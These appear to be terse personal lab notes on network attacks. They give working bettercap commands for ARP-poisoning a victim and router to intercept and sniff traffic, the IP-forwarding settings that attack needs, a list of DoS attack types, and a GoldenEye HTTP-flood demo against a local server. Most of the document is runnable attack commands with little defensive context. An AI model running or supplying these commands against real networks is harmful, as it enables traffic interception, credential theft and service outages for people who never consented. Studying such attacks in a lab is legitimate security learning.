man in the middle attack using arp poisoning

arp poisoning:
  bettercap
  net.probe on // it scans machines on network
  net.show
  exit

  // tell kali to forward packages
  echo 1 > /proc/sys/net/ipv4/ip_forward
  echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
  // stand between victim and router
  bettercap -eval "set arp.spoof.targets 192.168.0.108,192.168.0.1; set arp.spoof.fullduplex true;
    set arp.spoof.interval 10; arp.spoof on; net.sniff on"**
    // fullduplex means do spoof both directions

dos attack
  -volume based attacks - overwhelm bandwidth using udp, icmp, and spoofed-packet floods (measured in Bps).
  -protocol based: Exploit server resources and network infrastructure via SYN floods, Ping of Death, and Smurf DDoS (messured in Pps).
  -application based: Target web servers with GET/POST floods and low-and-slow attacks, appearing legitimate but causing creashes (measured in Rps).
  dos with GolenEye Demo:
    python3 -m http.server 8080
    python3 goldeneye.py http://192.168.0.135:8080
